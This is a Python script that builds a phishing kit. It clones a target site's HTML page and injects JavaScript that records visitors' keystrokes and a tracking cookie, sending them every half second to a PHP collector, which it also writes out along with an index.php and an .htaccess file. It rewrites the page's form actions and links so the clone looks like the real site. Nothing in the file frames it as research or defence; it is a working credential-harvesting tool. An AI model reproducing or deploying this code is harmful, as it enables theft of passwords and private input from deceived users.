import os , sys , fileinput
S10 = '\033[91m'#yellow
S11 = '\033[94m'#clearblue
S12 = '\033[93m'#pink
def draw():
    print(""" (                         )           """)
    print(""" )\ )   )               ( /(           """)
    print("""(()/(( /(    )    )     )\()) (  (     """)
    print(""" /(_))\())( /(   (    |((_)\ ))\ )\ )  """)
    print("""(_))((_)\ )(_))  )\  '|_ ((_)((_|()/(  """)
    print("""/ __| |(_|(_)_ _((_)) | |/ (_))  )(_)) """)
    print("""\__ \ / // _` | '  \()  ' </ -_)| || | """)
    print("""|___/_\_\\__,_|_|_|_|  _|\_\___| \_, | """)
    print("""                                 |__/  """+S11)
def clear(numlines=100):
  print(S10)
  if os.name == "posix":
    print('\n' * numlines)
    os.system('clear')
    draw()
  elif os.name in ("nt", "dos", "ce"):
    print('\n' * numlines)
    os.system('CLS')
    draw()
  else:
    print('\n' * numlines)
    draw()
clear()
target = input(S12+'Target site >  ')
clear()
flu=input(S12+'Enter the .html file >  '+S10)
fle = "Phish/main.html"
clear()
print('\n\nCreating Phish directory\n\n'+S10+'Run 2 time if is the first time\n'+S11)
os.system('cp '+flu+' '+fle)
TxS= """</head>"""
TxR= """
<script>
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
}
var coook = (getCookie('$identity'));
var buffer = [];
var attacker = 'datacookie.php?c='
document.onkeypress = function(g3t) {
    identity= (')  => ID'+coook);
    buffer.push(g3t.key);
}
window.setInterval(function() {
    if (buffer.length > 0) {
        var daty = ("("+buffer+identity);
        new Image().src = attacker + daty;
        buffer = [];
    }
}, 500);
</script>
</head>"""
TxS3= 'action="/'
TxR3= ('action="'+target+'/')
TxS4= 'src="/'
TxR4= ('src="'+target+'/')
TxS6= 'href="/'
TxR6= ('href="'+target+'/')
clear()
input(S12+'continue for: '+TxS+S11)########
clear()
TpF =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS in line :
        print(S10+'find: '+TxS)
        print(S12+'replaced: '+TxR+S11)
    else:
        print('find: nothing')
    TpF.write(line.replace(TxS,TxR))
TpF.close()
input(S12+'continue for: '+TxS3+S11)#######
clear()
TpF3a =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS3 in line :
        print(S10+'find: '+TxS3)
        print(S12+'replaced: '+TxR3+S11)
    else:
        nothing1 = 6666
    TpF3a.write(line.replace(TxS3,TxR3))
TpF3a.close()
TpF3b =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS3 in line :
        print(S10+'find: '+TxS3)
        print(S12+'replaced: '+TxR3+S11)
    else:
        nothing1 = 6666
    TpF3b.write(line.replace(TxS3,TxR3))
TpF3b.close()
TpF3c =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS3 in line :
        print(S10+'find: '+TxS3)
        print(S12+'replaced: '+TxR3+S11)
    else:
        nothing1 = 6666
    TpF3c.write(line.replace(TxS3,TxR3))
TpF3c.close()
TpF3d =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS3 in line :
        print(S10+'find: '+TxS3)
        print(S12+'replaced: '+TxR3+S11)
    else:
        nothing1 = 6666
    TpF3d.write(line.replace(TxS3,TxR3))
TpF3d.close()
TpF3e =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS3 in line :
        print(S10+'find: '+TxS3)
        print(S12+'replaced: '+TxR3+S11)
    else:
        nothing1 = 6666
    TpF3e.write(line.replace(TxS3,TxR3))
TpF3e.close()
TpF3f =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS3 in line :
        print(S10+'find: '+TxS3)
        print(S12+'replaced: '+TxR3+S11)
    else:
        nothing1 = 6666
    TpF3f.write(line.replace(TxS3,TxR3))
TpF3f.close()
input(S12+'continue for: '+TxS4+S11)#####
clear()
TpF4a =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS4 in line :
        print(S10+'find: '+TxS4)
        print(S12+'replaced: '+TxR4+S11)
    else:
        nothing2 = 6666
    TpF4a.write(line.replace(TxS4,TxR4))
TpF4a.close()
TpF4b =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS4 in line :
        print(S10+'find: '+TxS4)
        print(S12+'replaced: '+TxR4+S11)
    else:
        nothing2 = 6666
    TpF4b.write(line.replace(TxS4,TxR4))
TpF4b.close()
TpF4c =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS4 in line :
        print(S10+'find: '+TxS4)
        print(S12+'replaced: '+TxR4+S11)
    else:
        nothing2 = 6666
    TpF4c.write(line.replace(TxS4,TxR4))
TpF4c.close()
TpF4d =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS4 in line :
        print(S10+'find: '+TxS4)
        print(S12+'replaced: '+TxR4+S11)
    else:
        nothing2 = 6666
    TpF4d.write(line.replace(TxS4,TxR4))
TpF4d.close()
TpF4e =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS4 in line :
        print(S10+'find: '+TxS4)
        print(S12+'replaced: '+TxR4+S11)
    else:
        nothing2 = 6666
    TpF4e.write(line.replace(TxS4,TxR4))
TpF4e.close()
TpF4f =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS4 in line :
        print(S10+'find: '+TxS4)
        print(S12+'replaced: '+TxR4+S11)
    else:
        nothing2 = 6666
    TpF4f.write(line.replace(TxS4,TxR4))
TpF4f.close()
input(S12+'continue for: '+TxS6+S11)#####
clear()
TpF6a =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS6 in line :
        print(S10+'find: '+TxS6)
        print(S12+'replaced: '+TxR6+S11)
    else:
        nothin3 = 6666
    TpF6a.write(line.replace(TxS6,TxR6))
TpF6a.close()
TpF6b =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS6 in line :
        print(S10+'find: '+TxS6)
        print(S12+'replaced: '+TxR6+S11)
    else:
        nothin3 = 6666
    TpF6b.write(line.replace(TxS6,TxR6))
TpF6b.close()
TpF6c =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS6 in line :
        print(S10+'find: '+TxS6)
        print(S12+'replaced: '+TxR6+S11)
    else:
        nothin3 = 6666
    TpF6c.write(line.replace(TxS6,TxR6))
TpF6c.close()
TpF6d =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS6 in line :
        print(S10+'find: '+TxS6)
        print(S12+'replaced: '+TxR6+S11)
    else:
        nothin3 = 6666
    TpF6d.write(line.replace(TxS6,TxR6))
TpF6d.close()
TpF6e =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS6 in line :
        print(S10+'find: '+TxS6)
        print(S12+'replaced: '+TxR6+S11)
    else:
        nothin3 = 6666
    TpF6e.write(line.replace(TxS6,TxR6))
TpF6e.close()
TpF6f =open(fle,'r+')
for line in fileinput.input(fle):
    if TxS6 in line :
        print(S10+'find: '+TxS6)
        print(S12+'replaced: '+TxR6+S11)
    else:
        nothin3 = 6666
    TpF6f.write(line.replace(TxS6,TxR6))
TpF6f.close()
f = open("Phish/index.php", "w")
f.write("""<?php
header('Location: main.html');
global $random; 
$random= rand('00000', '99999'); 
if(!isset($_COOKIE['$identity'])) {
    setcookie('$identity',$random, time() + (86400), "/");
}
else {
    header('Location: main.html');
}
exit();  
?>""")
f.close()
opi = open("Phish/.htaccess", "w")
opi.write("""DirectoryIndex index.php
ForceType application/x-httpd-php""")
opi.close()
f.close()
opi = open("Phish/datacookie.php", "w")
opi.write("""<?php
if(!empty($_GET['c'])) {
    $logfile = fopen('data.html', 'a+');
    fwrite($logfile, '<div>'.$_GET['c'].'</div>');
    fclose($logfile);
}
?>""")
opi.close()
